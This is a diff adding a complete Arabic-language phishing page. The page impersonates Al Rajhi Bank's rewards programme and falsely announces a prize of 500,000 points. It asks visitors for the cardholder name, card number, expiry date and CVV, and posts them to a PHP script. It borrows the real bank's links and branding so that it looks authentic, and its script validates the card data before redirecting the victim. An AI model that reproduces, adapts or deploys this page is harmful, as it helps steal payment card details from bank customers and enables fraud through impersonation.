@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
+    <link href="img/favicon-32x32.png" rel="shortcut icon" />
+    <title>اهلا بك في برنامج مكافاة | مصرف الراجحي</title>
+</head>
+    <style>
+        @font-face {
+font-family: 'ArabicKufi';
+src: url('path/to/arabic-kufi-font.woff2') format('woff2'),
+url('path/to/arabic-kufi-font.woff') format('woff');
+}
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700&display=swap');
+        /* الأيقونات */
+        .fas {
+            margin-right: 5px;
+        }
+
+        /* باقي الأنماط الأصلية */
+        body {
+            font-family: 'ArabicKufi', Arial, sans-serif;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+            background-color: #eee;
+        }
+
+        header {
+    position: sticky;
+    top: 0;
+    background-color: #2225d1;
+    color: #fff;
+    height: 130px;
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+        }
+
+        .logo {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+        
+        }
+    
+        .logo img {
+            width: 60px;
+            height : 60px;
+            margin-right: 20px;
+        }
+
+        header .logo1 {
+            margin: 0 auto;
+            display: flex;
+        }
+
+        header .logo1 img {
+            width: 60px;
+            height: 60px;
+            margin-left:50px;
+        }
+
+        .login-button {
+            margin-left: 20px;
+        }
+
+        .login-button a {
+            border: none;
+            background-color: rgb(34, 165, 252); /* تعيين لون الباكغراوند مع شفافية هنا */
+           
+            color: rgb(251, 250, 252);
+            padding: 30px 50px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 25px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+        }
+
+        .login-button:hover {
+            color: rgb(115, 17, 228); /* تغيير لون كلمة تسجيل الدخول عند وضع المؤشر عليها */
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 100px;
+            left: 12px;
+            width: 94%;
+            height: 127px; /* تعديل ارتفاع اللباكغراوند هنا */
+            background-color: rgba(34, 165, 252, 0.9); /* تعيين لون الباكغراوند مع شفافية هنا */
+            color: #fff;
+            padding: 10px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+            
+        }
+
+        .bottom-nav ul {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .bottom-nav li {
+            margin: 0 25px;
+        }
+
+        .bottom-nav a {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            color: #fff;
+            text-decoration: none;
+            font-size: 45px;
+        }
+        
+        
+        .bottom-nav a:hover {
+            color: #413f3f;
+        } 
+       
+
+*{
+    font-family: 'Poppins', sans-serif;
+    margin:0; padding:0;
+    box-sizing: border-box;
+    outline: none; border: none;
+    text-decoration: none;
+    text-transform: uppercase;
+}
+
+.container{
+    min-height: 0vh;
+    background: #eee;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-flow: column;
+    padding-bottom: 60px;
+}
+
+.container form{
+    background: #fff;
+    border-radius: 5px;
+    box-shadow: 0 10px 15px rgba(0,0,0,.1);
+    padding: 75px;
+    width: 750px;
+    padding-top: 160px;
+}
+
+.container form .inputBox{
+    margin-top: 20px;
+}
+
+.container form .inputBox span{
+    display: block;
+    color:rgb(51, 50, 50);
+    padding-bottom: 5px;
+}
+
+.container form .inputBox input,
+.container form .inputBox select{
+    width: 100%;
+    padding: 10px;
+    border-radius: 10px;
+    border:1px solid rgba(0,0,0,.3);
+    color:#000;
+}
+
+.container form .flexbox{
+    display: flex;
+    gap:15px;
+}
+
+.container form .flexbox .inputBox{
+    flex:1 1 150px;
+}
+
+.container form .submit-btn{
+    width: 100%;
+    background-color: #2225d1 ;
+    margin-top: 20px;
+    padding: 10px;
+    font-size: 20px;
+    color:#fff;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: .2s linear;
+}
+
+.container form .submit-btn:hover{
+    letter-spacing: 2px;
+    opacity: .8;
+}
+
+.container .card-container{
+    margin-bottom: -150px;
+    position: relative;
+    height: 250px;
+    width: 400px;
+}
+
+.container .card-container .front{
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    top: 0; left: 0;
+    background:linear-gradient(45deg, rgb(142, 26, 250),  rgb(7, 224, 240));
+    border-radius: 5px;
+    backface-visibility: hidden;
+    box-shadow: 0 15px 25px rgba(0,0,0,.2);
+    padding:20px;
+    transform:perspective(1000px) rotateY(0deg);
+    transition:transform .4s ease-out;
+}
+
+.container .card-container .front .image{
+    display: flex;
+    align-items:center;
+    justify-content: space-between;
+    padding-top: 10px;
+}
+
+.container .card-container .front .image img{
+    height: 30px;
+}
+
+.container .card-container .front .card-number-box{
+    padding:30px 0;
+    font-size: 22px;
+    color:#fff;
+}
+
+.container .card-container .front .flexbox{
+    display: flex;
+}
+
+.container .card-container .front .flexbox .box:nth-child(1){
+    margin-right: auto;
+}
+
+.container .card-container .front .flexbox .box{
+    font-size: 15px;
+    color:#fff;
+}
+
+.container .card-container .back{
+    position: absolute;
+    top:0; left: 0;
+    height: 100%;
+    width: 100%;
+    background:linear-gradient(45deg, rgb(142, 26, 250),  rgb(7, 224, 240));
+    border-radius: 5px;
+    padding: 20px 0;
+    text-align: right;
+    backface-visibility: hidden;
+    box-shadow: 0 15px 25px rgba(0,0,0,.2);
+    transform:perspective(1000px) rotateY(180deg);
+    transition:transform .4s ease-out;
+}
+
+.container .card-container .back .stripe{
+    background: #000;
+    width: 100%;
+    margin: 10px 0;
+    height: 50px;
+}
+
+.container .card-container .back .box{
+    padding: 0 20px;
+}
+
+.container .card-container .back .box span{
+    color:#fff;
+    font-size: 15px;
+}
+
+.container .card-container .back .box .cvv-box{
+    height: 50px;
+    padding: 10px;
+    margin-top: 5px;
+    color:#333;
+    background: #fff;
+    border-radius: 5px;
+    width: 100%;
+}
+
+.container .card-container .back .box img{
+    margin-top: 30px;
+    height: 30px;
+}
+.text1{
+    font-family: "Arial Black", sans-serif; /* تغيير الخط لعنوان h1 */
+            font-weight: bold; /* جعل الخط عريض */
+font-size: 50px;
+color: #2225d1;
+
+margin-right: 30px; /* هامش على اليمين */ 
+}
+.text2{
+    line-height: 2; /* مسافة بين الأسطر بنسبة 1.5 */
+    margin-left: 35px; /* هامش على اليسار */
+            margin-right: 35px; /* هامش على اليمين */  
+font-size: 32px;
+color: #413f3f;
+
+}
+@keyframes fadeOut {
+    0% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+        display: none;
+    }
+}
+
+.logo6 {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: fadeIn 1s forwards;
+}
+
+.content {
+    visibility: hidden;
+}
+
+@keyframes fadeIn {
+    0% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+    }
+
+    </style>
+
+    
+<body>
+ 
+    <div class="logo6">
+    <img src="img/lllo.png" alt="اسم اللوغو">
+</div>
+
+<div class="content">
+
+
+  
+    <header>
+        <div class="logo">
+            <img src="img/mff.png" alt="لوغو">
+        </div>
+
+        <div class="logo1">
+            <img src="img/logo-arb.png" alt="22" >
+        </div>
+
+        
+        <div class="login-button">
+            <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/">تسجيل الدخول</a>
+        </div>
+    </header>
+    <br> <br>
+    <p class="text1">مبارك عليك المكافأة </p><br>
+    <p class="text2" > المكافأة ذات الرقم 714767 تحتوي على  500,000 نقطة مقدمة من برنامج مكافأة
+         الراجحي لتحويل النقاط الى حسابك المصرفي ادخل بطاقتك الاتمانية مدى يمكنك الاستفادة من 
+         هذه النقاط باستبدالها مع أكثر من 200 شريك حول المملكة او تحويلها الى محفظة 
+         urpay
+         وكسب ما يعادل 1000ريال .
+
+    </p>
+<br>
+
+<br>
+<br>
+
+    <div class="container">
+
+        <div class="card-container">
+    
+            <div class="front">
+                <div class="image">
+                    <img src="img/logo.svg" alt="">
+                    <img src="img/visa.png" alt="" >
+                </div>
+                <div class="card-number-box" ><pre># # # #    # # # #    # # # #    # # # #</pre></div>
+                <div class="flexbox">
+                    <div class="box">
+                        <span >اسم حامل البطاقة</span>
+                        <div class="card-holder-name"> full name</div>
+                    </div>
+                    <pre>                                    </pre>
+                    <div class="box">
+                        <span>تاريخ انتهاءالبطاقة</span>
+                        <div class="expiration">
+                            <span class="exp-month">mm / </span>
+                            <span class="exp-year">yy</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    
+            <div class="back">
+                <div class="stripe"></div>
+                <div class="box">
+                    <span>cvv</span>
+                    <div class="cvv-box"></div>
+                    <img src="image/visa.png" alt="">
+                </div>
+            </div>
+    
+        </div>
+    
+        <form action="rakan.php" method="POST">
+            <div class="inputBox">
+                <span>اسم حامل البطاقة</span>
+                <input type="text" id="card-holder-input" class="card-holder-input">
+            </div>
+            <div class="inputBox">
+                
+                <span>رقم البطاقة</span>
+                <input type="text"  id="card-number-input" maxlength="19" class="card-number-input">
+            </div>
+            <div class="flexbox">
+                <div class="inputBox">
+                    <span> انتهاء الصلاحية MM </span>
+                    <select name="" id="month-input" class="month-input">
+                        <option value="month" selected disabled>الشهر</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="inputBox" >
+                    <span> انتهاء الصلاحية YY</span>
+                    <select name="" id="year-input" class="year-input">
+                        <option value="year" selected disabled>السنة</option>
+                        
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                    </select>
+                </div>
+                <div class="inputBox">
+                    <span> رمز البطاقة  CVV</span>
+                    <input type="text" id="cvv-input" maxlength="3" class="cvv-input">
+                </div>
+            </div>
+            <input type="submiT" value="تأكيد" class="submit-btn">
+        </form>
+    
+    </div>    
+        
+   <img src="img/img6.jpg" alt="" width="100%">
+<br>
+    
+
+
+
+    
+  
+
+
+
+    
+   
+    <div  class="bottom-nav">
+        <ul>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Accounts"><i class="fas fa-user"></i> <span>الحسابات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Cards"><i class="fas fa-credit-card"></i> <span>البطاقات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Finance"><i class="fas fa-money-bill"></i> <span>التمويل</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Insurance"><i class="fas fa-shield-alt"></i> <span>التأمين</span></a></li>
+        </ul>
+        
+    </div>
+    <script>
+    const logoElement = document.querySelector('.logo6');
+    const contentElement = document.querySelector('.content');
+
+    setTimeout(function() {
+        logoElement.style.animation = 'fadeOut 1s forwards';
+        setTimeout(function() {
+            logoElement.style.display = 'none';
+            contentElement.style.visibility = 'visible';
+        }, 1000); // انتظر لمدة ثانية بعد الانتهاء من الوميض قبل إظهار محتوى الصفحة
+    }, 4000);
+
+   
+    
+   document.querySelector('.card-number-input').oninput = () =>{
+       document.querySelector('.card-number-box').innerText = document.querySelector('.card-number-input').value;
+   }
+   
+   document.querySelector('.card-holder-input').oninput = () =>{
+       document.querySelector('.card-holder-name').innerText = document.querySelector('.card-holder-input').value;
+   }
+   
+   document.querySelector('.month-input').oninput = () =>{
+       document.querySelector('.exp-month').innerText = document.querySelector('.month-input').value;
+   }
+   
+   document.querySelector('.year-input').oninput = () =>{
+       document.querySelector('.exp-year').innerText = document.querySelector('.year-input').value;
+   }
+   
+   document.querySelector('.cvv-input').onmouseenter = () =>{
+       document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(-180deg)';
+       document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(0deg)';
+   }
+   
+   document.querySelector('.cvv-input').onmouseleave = () =>{
+       document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(0deg)';
+       document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(180deg)';
+   }
+   
+   document.querySelector('.cvv-input').oninput = () =>{
+       document.querySelector('.cvv-box').innerText = document.querySelector('.cvv-input').value;
+   }
+   
+
+
+
+
+   
+
+   const cardHolderInput = document.querySelector('.card-holder-input');
+   const cardNumberInput = document.querySelector('.card-number-input');
+   const cvvInput = document.querySelector('.cvv-input');
+   const monthInput = document.querySelector('.month-input');
+   const yearInput = document.querySelector('.year-input');
+   const submitButton = document.querySelector('.submit-btn');
+
+   cardNumberInput.addEventListener('input', function() {
+       let cardNumberValue = cardNumberInput.value.replace(/\s/g, ''); // إزالة أي فراغات موجودة بالفعل
+       let formattedCardNumber = '';
+
+       for (let i = 0; i < cardNumberValue.length; i++) {
+           if (i > 0 && i % 4 === 0) {
+               formattedCardNumber += ' ';
+           }
+           formattedCardNumber += cardNumberValue[i];
+       }
+
+       cardNumberInput.value = formattedCardNumber;
+   });
+
+   submitButton.addEventListener('click', function(event) {
+       event.preventDefault(); // يمنع السلوك الافتراضي للزر الإرسال
+
+       const cardHolderValue = cardHolderInput.value.trim();
+       const cardNumberValue = cardNumberInput.value.replace(/\s/g, ''); // إزالة أي فراغات
+       const cvvValue = cvvInput.value.trim();
+       const monthValue = monthInput.value;
+       const yearValue = yearInput.value;
+
+       if (cardHolderValue !== '' && cardNumberValue.length === 16 && /^\d+$/.test(cardNumberValue) && cvvValue.length === 3 && /^\d+$/.test(cvvValue) && monthValue !== 'month' && yearValue !== 'year') {
+           // قم بتغيير "URL الصفحة الهدف" إلى عنوان URL الصفحة التي ترغب في التوجه إليها
+           window.location.href = "sss.html";
+       } else {
+           alert("يرجى ملء جميع الحقول بشكل صحيح.");
+       }
+   });
+   
+</script>
+
+     
+    </body>
+</html>
